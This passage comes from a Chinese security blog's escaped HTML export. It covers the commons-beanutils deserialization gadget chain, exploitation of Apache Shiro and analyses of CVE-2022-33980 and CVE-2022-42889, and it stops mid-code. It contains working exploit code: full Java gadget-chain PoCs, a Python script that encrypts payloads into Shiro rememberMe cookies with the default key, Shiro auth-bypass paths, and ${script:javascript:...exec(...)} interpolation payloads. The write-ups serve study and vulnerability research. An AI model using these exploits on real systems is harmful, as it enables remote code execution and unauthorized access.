src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/cb/e9a00cb309fdabed4c5b08e593dc9cf1.png\" alt=\"image-20220309155025401\"></p>\n<p>向上需要寻找调用 <strong>getProperty()</strong> 的地方，commons-beanutils 里有一个 <strong>BeanComparator</strong> 类的 <strong>compare</strong>方法，以这里为起点，串起了整条链子</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/cb/7d1c0bde75644f9fc045a5e38b3f414b.png\" alt=\"image-20220309155316931\"></p>\n<p>那么最开始是从<strong>哪个readObject才能调用compare方法</strong>？在CC2中知道 <strong>PriorityQueue</strong> 重写了readObject方法，执行了<strong>java.util.Comparator</strong> 接口的 <strong>compare()</strong> 方法，至此链子完整</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/cb/12de11915947c8706214fb248a759aa1.png\" alt=\"image-20220309155804696\"></p>\n<h1 id=\"构造poc\"><a href=\"#构造poc\" class=\"headerlink\" title=\"构造poc\"></a>构造poc</h1><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> CB;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassPool;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Comparator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.PriorityQueue;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CB</span> </span>&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//创建TemplateImpl 对象动态加载字节码</span></span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] code = ClassPool.getDefault().get(<span class=\"string\">&quot;bytecode.Calc&quot;</span>).toBytecode();</span><br><span class=\"line\">        TemplatesImpl obj = <span class=\"keyword\">new</span> TemplatesImpl();</span><br><span class=\"line\">        setFieldValue(obj,<span class=\"string\">&quot;_name&quot;</span>,<span class=\"string\">&quot;a&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//setFieldValue(obj,&quot;_class&quot;,null);</span></span><br><span class=\"line\">        <span class=\"comment\">//setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class=\"line\">        setFieldValue(obj,<span class=\"string\">&quot;_bytecodes&quot;</span>,<span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[][]&#123;code&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//创建BeanComparator</span></span><br><span class=\"line\">        Comparator comparator = <span class=\"keyword\">new</span> BeanComparator(<span class=\"string\">&quot;outputProperties&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        PriorityQueue priorityQueue = <span class=\"keyword\">new</span> PriorityQueue(<span class=\"number\">2</span>);</span><br><span class=\"line\">        <span class=\"comment\">//先设置为正常变量值，后面可以通过setFieldValue修改</span></span><br><span class=\"line\">        priorityQueue.add(<span class=\"number\">1</span>);</span><br><span class=\"line\">        priorityQueue.add(<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//反射设置 Field</span></span><br><span class=\"line\">        Object[] objects = <span class=\"keyword\">new</span> Object[]&#123;obj,<span class=\"number\">1</span>&#125;;</span><br><span class=\"line\">        <span class=\"comment\">//setFieldValue(comparator,&quot;property&quot;,&quot;outputProperties&quot;);</span></span><br><span class=\"line\">        setFieldValue(priorityQueue, <span class=\"string\">&quot;queue&quot;</span>, objects);</span><br><span class=\"line\">        setFieldValue(priorityQueue, <span class=\"string\">&quot;comparator&quot;</span>, comparator);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(priorityQueue);</span><br><span class=\"line\">        <span class=\"comment\">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        FileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title\">unserialize</span><span class=\"params\">(String Filname)</span> <span class=\"keyword\">throws</span> Exception, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">        FileInputStream fis = <span class=\"keyword\">new</span> FileInputStream(Filname);</span><br><span class=\"line\">        ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(fis);</span><br><span class=\"line\">        Object obj = ois.readObject();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setFieldValue</span><span class=\"params\">(Object obj,String fieldname,Object value)</span><span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Field field = obj.getClass().getDeclaredField(fieldname);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(obj,value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在序列化的时候报错，在 BeanComparator </p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/cb/e9983e81daf06a98f8a807af46eeaf02.png\" alt=\"image-20220309163136570\"></p>\n<p>跟进，没有找到 ComparableComparator ，这个类来自于 commons.collections ，但是已经进行了删除</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/cb/54404185569de03bd22c7d217ac31a34.png\" alt=\"image-20220309163313045\"></p>\n<p>所以需要找一个可以替换的，需要满足</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">实现java.util.Comparator 接口</span><br><span class=\"line\">实现java.io.Serializable 接口</span><br><span class=\"line\">Java、shiro或commons-beanutils自带，且兼容性强</span><br></pre></td></tr></table></figure>\n\n<p>通过IDEA的快捷键Ctrl+Alt+B搜索接口的实现类。找到了<strong>CaseInsensitiveComparator</strong>。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/cb/e8074aeecd1c7d6ee6911e72794b0e96.png\" alt=\"image-20220309164648452\"></p>\n<p>可以通过 <strong>CASE_INSENSITIVE_ORDER</strong> 拿到 CaseInsensitiveComparator 类</p>\n<blockquote>\n<p>这个CaseInsensitiveComparator 类是java.lang.String 类下的一个内部私有类，其实现了Comparator 和Serializable ，且位于Java的核心代码中，兼容性强，是一个完美替代品。我们通过 String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的CaseInsensitiveComparator 对象，用它来实例化 BeanComparator。</p>\n</blockquote>\n<p>然后用 BeanComparator 第三种构造方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/cb/b6f52f80ee3f04350d781eeb97a35f4b.png\" alt=\"image-20220309164809686\"></p>\n<h1 id=\"最终poc\"><a href=\"#最终poc\" class=\"headerlink\" title=\"最终poc\"></a>最终poc</h1><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> CB;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassPool;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Comparator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.PriorityQueue;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"keyword\">static</span> java.lang.String.CASE_INSENSITIVE_ORDER;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CB</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setFieldValue</span><span class=\"params\">(Object obj,String fieldname,Object value)</span><span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Field field = obj.getClass().getDeclaredField(fieldname);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(obj,value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//创建TemplateImpl 对象动态加载字节码</span></span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] code = ClassPool.getDefault().get(<span class=\"string\">&quot;bytecode.Calc&quot;</span>).toBytecode();</span><br><span class=\"line\">        TemplatesImpl obj = <span class=\"keyword\">new</span> TemplatesImpl();</span><br><span class=\"line\">        setFieldValue(obj,<span class=\"string\">&quot;_name&quot;</span>,<span class=\"string\">&quot;a&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//setFieldValue(obj,&quot;_class&quot;,null);</span></span><br><span class=\"line\">        <span class=\"comment\">//setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class=\"line\">        setFieldValue(obj,<span class=\"string\">&quot;_bytecodes&quot;</span>,<span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[][]&#123;code&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//创建BeanComparator</span></span><br><span class=\"line\">        Comparator comparator = <span class=\"keyword\">new</span> BeanComparator(<span class=\"keyword\">null</span>,CASE_INSENSITIVE_ORDER);</span><br><span class=\"line\"></span><br><span class=\"line\">        PriorityQueue priorityQueue = <span class=\"keyword\">new</span> PriorityQueue(<span class=\"number\">2</span>);</span><br><span class=\"line\">        <span class=\"comment\">//先设置为正常变量值，后面可以通过setFieldValue修改</span></span><br><span class=\"line\">        priorityQueue.add(<span class=\"number\">1</span>);</span><br><span class=\"line\">        priorityQueue.add(<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//反射设置 Field</span></span><br><span class=\"line\">        Object[] objects = <span class=\"keyword\">new</span> Object[]&#123;obj,<span class=\"number\">1</span>&#125;;</span><br><span class=\"line\">        setFieldValue(comparator,<span class=\"string\">&quot;property&quot;</span>,<span class=\"string\">&quot;outputProperties&quot;</span>);</span><br><span class=\"line\">        setFieldValue(priorityQueue, <span class=\"string\">&quot;queue&quot;</span>, objects);</span><br><span class=\"line\">        setFieldValue(priorityQueue, <span class=\"string\">&quot;comparator&quot;</span>, comparator);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//serialize(priorityQueue);</span></span><br><span class=\"line\">        unserialize(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        FileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title\">unserialize</span><span class=\"params\">(String Filname)</span> <span class=\"keyword\">throws</span> Exception, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">        FileInputStream fis = <span class=\"keyword\">new</span> FileInputStream(Filname);</span><br><span class=\"line\">        ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(fis);</span><br><span class=\"line\">        Object obj = ois.readObject();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"shiro中的利用\"><a href=\"#shiro中的利用\" class=\"headerlink\" title=\"shiro中的利用\"></a>shiro中的利用</h1><p>在shiro中如果没有CC依赖，可以利用CB链，因为shiro 是依赖于 commons-beanutils 的,去掉pom.xml中的CC依赖，python生成payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\">from Crypto.Cipher import AES</span><br><span class=\"line\"> </span><br><span class=\"line\">with open(r&quot;ser.bin&quot;,&quot;rb&quot;) as f:</span><br><span class=\"line\">    byte_POC &#x3D; f.read()</span><br><span class=\"line\">    BS &#x3D; AES.block_size</span><br><span class=\"line\">    pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class=\"line\">    key &#x3D; &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class=\"line\">    mode &#x3D; AES.MODE_CBC</span><br><span class=\"line\">    iv &#x3D; b&#39; &#39; * 16</span><br><span class=\"line\">    encryptor &#x3D; AES.new(base64.b64decode(key), mode, iv)</span><br><span class=\"line\">    file_body &#x3D; pad(byte_POC)</span><br><span class=\"line\">    base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class=\"line\">    print(&quot;rememberMe&#x3D;&#123;&#125;&quot;.format(base64_ciphertext.decode()))</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/cb/3f68a5c855798bbf681c697df0a6e8cf.png\" alt=\"image-20220309170133185\"></p>\n<h1 id=\"shiro-权限绕过\"><a href=\"#shiro-权限绕过\" class=\"headerlink\" title=\"shiro 权限绕过\"></a>shiro 权限绕过</h1><h2 id=\"CVE-2020-1957\"><a href=\"#CVE-2020-1957\" class=\"headerlink\" title=\"CVE-2020-1957\"></a>CVE-2020-1957</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;xxx&#x2F;..;&#x2F;admin</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"CVE-2020-11989\"><a href=\"#CVE-2020-11989\" class=\"headerlink\" title=\"CVE-2020-11989\"></a>CVE-2020-11989</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;;&#x2F;admin</span><br><span class=\"line\">&#x2F;admin&#x2F;a%25%32%66a</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"CVE-2020-13933\"><a href=\"#CVE-2020-13933\" class=\"headerlink\" title=\"CVE-2020-13933\"></a>CVE-2020-13933</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;admin&#x2F;%3baaa</span><br></pre></td></tr></table></figure>\n\n","categories":["Java反序列化"]},{"title":"CVE-2022-33980、CVE-2022-42889","url":"/2023/12/25/CVE-2022-33980/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>Apache Commons Configuration：CVE-2022-33980的分析以及Apache Commons Text组件的后续分析：CVE-2022-42889</p>\n<a id=\"more\"></a>\n\n<h1 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h1><p>Apache发布安全公告，修复了一个存在Apache Commons Configuration组件中的远程代码执行漏洞。该漏洞是由于Apache Commons Configuration 在执行变量interpolation时，允许动态评估和扩展属性，interpolation的标准格式为”${prefix:name}”，其中”prefix”用于定位执行interpolation的 org.apache.commons.configuration2.interpol.Lookup类。当用户调用Lookup类时可能导致攻击者执行任意代码或远程连接服务器。具体实例为：</p>\n<ul>\n<li> “script” - execute expressions using the JVM script execution engine (javax.script) - </li>\n<li>“dns” - resolve dns records - </li>\n<li>“url” - load values from urls, including from remote servers</li>\n</ul>\n<h1 id=\"相关介绍\"><a href=\"#相关介绍\" class=\"headerlink\" title=\"相关介绍\"></a>相关介绍</h1><p>Apache Commons Configuration是一个Java应用程序的配置管理工具，可以从properties或者xml文件中加载软件的配置信息，用来构建支撑软件运行的基础环境。简单的使用见：<a href=\"https://blog.csdn.net/jianggujin/article/details/51167495\">commons-configuration使用介绍</a></p>\n<h1 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h1><p>2.4 &lt;= Apache Commons Configuration &lt;= 2.7</p>\n<h1 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h1><p>maven导入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">\t&lt;groupId&gt;org.apache.commons&lt;&#x2F;groupId&gt;</span><br><span class=\"line\">\t&lt;artifactId&gt;commons-configuration2&lt;&#x2F;artifactId&gt;</span><br><span class=\"line\">\t&lt;version&gt;2.7&lt;&#x2F;version&gt;</span><br><span class=\"line\">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>\n\n<p>Demo.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.configuration2.interpol.ConfigurationInterpolator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.configuration2.interpol.InterpolatorSpecification;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Demo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        InterpolatorSpecification interpolatorSpecification = <span class=\"keyword\">new</span> InterpolatorSpecification.Builder()</span><br><span class=\"line\">                .withPrefixLookups(ConfigurationInterpolator.getDefaultPrefixLookups())</span><br><span class=\"line\">                .withDefaultLookups(ConfigurationInterpolator.getDefaultPrefixLookups().values())</span><br><span class=\"line\">                .create();</span><br><span class=\"line\">        <span class=\"comment\">//创建示例</span></span><br><span class=\"line\">        ConfigurationInterpolator configurationInterpolator = ConfigurationInterpolator.fromSpecification(interpolatorSpecification);</span><br><span class=\"line\">        <span class=\"comment\">// 解析字符串</span></span><br><span class=\"line\">        Object interpolate = configurationInterpolator.interpolate(<span class=\"string\">&quot;$&#123;script:javascript:java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;)&#125;&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"简要分析\"><a href=\"#简要分析\" class=\"headerlink\" title=\"简要分析\"></a>简要分析</h1><p>根据漏洞信息，组件的Variable Interpolation(变量插值)功能可以动态的执行和扩展，相关格式为 <code>$&#123;prefix:name&#125;</code> 更新后默认情况下不启用script，dns，url。</p>\n<p>大概率问题出现在script。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014140919371.png\" alt=\"image-20221014140919371\"></p>\n<p>查找关于Variable Interpolation文档</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014141752415.png\" alt=\"image-20221014141752415\"></p>\n<p>其中 Commons configuration 可通过 getDefaultPrefixLookups 获取所有内置的prefix(前缀)，根据不同的前缀执行不同的功能</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014142017823.png\" alt=\"image-20221014142017823\"></p>\n<p>有以下前缀</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">date</span><br><span class=\"line\">localhost</span><br><span class=\"line\">const</span><br><span class=\"line\">urlDecoder</span><br><span class=\"line\">dns</span><br><span class=\"line\">base64Encoder</span><br><span class=\"line\">env</span><br><span class=\"line\">sys</span><br><span class=\"line\">script</span><br><span class=\"line\">url</span><br><span class=\"line\">file</span><br><span class=\"line\">java</span><br><span class=\"line\">resourceBundle</span><br><span class=\"line\">xml</span><br><span class=\"line\">base64Decoder</span><br><span class=\"line\">properties</span><br><span class=\"line\">urlEncoder</span><br></pre></td></tr></table></figure>\n\n<p>看到script</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014143936013.png\" alt=\"image-20221014143936013\"></p>\n<p>后续其实能发现都转到了org.apache.commons.text.lookup.StringLookupFactory类中的方法进行解析</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014144303429.png\" alt=\"image-20221014144303429\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014144536251.png\" alt=\"image-20221014144536251\"></p>\n<p>所以可能利用 Nashorn JavaScript 脚本引擎调用eval执行java代码</p>\n<h1 id=\"动态调试\"><a href=\"#动态调试\" class=\"headerlink\" title=\"动态调试\"></a>动态调试</h1><p>interpolate()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014145437089.png\" alt=\"image-20221014145437089\"></p>\n<p>looksLikeSingleVariable() 判断以 <code>$&#123;</code> 开头，以 <code>&#125;</code> 结尾的格式</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014145537578.png\" alt=\"image-20221014145537578\"></p>\n<p>resolveSingleVariable() 调用 extractVariableName() 去掉格式符号<code>$&#123;&#125;</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014145654407.png\" alt=\"image-20221014145654407\"></p>\n<p>resolve()分离prefix与name，value字段通过寻找然后实例prefix相对应的对象，再调用其lookup方法。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014150006027.png\" alt=\"image-20221014150006027\"></p>\n<p>fetchLookupForPrefix()，直接从 prefixLookups 这个Map对象属性中获取script对应的 StringLookupAdapter 类，其中定义stringLookup为scriptStringLookup实例</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014150353402.png\" alt=\"image-20221014150353402\"></p>\n<p>lookup()方法中调用ScriptStringLookup#lookup()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014151226841.png\" alt=\"image-20221014151226841\"></p>\n<p>跟进lookup()，Nashorn引擎调用eval()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014151618077.png\" alt=\"image-20221014151618077\"></p>\n<p>走到evalImpl()，执行命令。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014151828625.png\" alt=\"image-20221014151828625\"></p>\n<h1 id=\"关于Apache-Commons-text\"><a href=\"#关于Apache-Commons-text\" class=\"headerlink\" title=\"关于Apache Commons text\"></a>关于Apache Commons text</h1><p>昨晚看Y4师傅发了关于apache commons text，既然上面也涉及到apache commons text，再分析一下text吧。</p>\n<p>当天分析时发现，CVE编号已经添加上了：<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-42889\">NVD - CVE-2022-42889 (nist.gov)</a></p>\n<h2 id=\"简要分析-1\"><a href=\"#简要分析-1\" class=\"headerlink\" title=\"简要分析\"></a>简要分析</h2><p>官网更新1.10.0版本</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014152603481.png\" alt=\"image-20221014152603481\"></p>\n<p>看到其中一条记录，还是那三个prefix，这里多出来了 <strong>StringSubstitutor.createInterpolator()</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014152942668.png\" alt=\"image-20221014152942668\"></p>\n<p>翻看文档</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014153749272.png\" alt=\"image-20221014153749272\"></p>\n<p>可以看到功能其实差不多，并且肯定支持script。</p>\n<h2 id=\"动态调试-1\"><a href=\"#动态调试-1\" class=\"headerlink\" title=\"动态调试\"></a>动态调试</h2><p>跟进replace()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014155206612.png\" alt=\"image-20221014155206612\"></p>\n<p>在substitute()中通过resolveVariable()解析内容</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014155357675.png\" alt=\"image-20221014155357675\"></p>\n<p>resolveVariable()中就非常熟悉了，获取所有的prefix</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014154820375.png\" alt=\"image-20221014154820375\"></p>\n<p>然后就不用跟了，调用ScriptStringLookup#lookup()，Nashorn引擎调用eval()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/CVE-2022-33980/image-20221014155041623.png\" alt=\"image-20221014155041623\"></p>\n<h2 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h2><p>maven</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;org.apache.commons&#x2F;commons-text --&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.apache.commons&lt;&#x2F;groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;commons-text&lt;&#x2F;artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;1.9&lt;&#x2F;version&gt;</span><br><span class=\"line\">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>\n\n<p>poc：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.text.StringSubstitutor;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Demo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        StringSubstitutor interpolator = StringSubstitutor.createInterpolator();</span><br><span class=\"line\">        String text = interpolator.replace(<span class=\"string\">&quot;$&#123;script:javascript:java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;)&#125;&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>利用nashorn调用SecureClassLoader进行类加载</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import org.apache.commons.text.StringSubstitutor;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Demo &#123;</span><br><span class=\"line\">    public static void 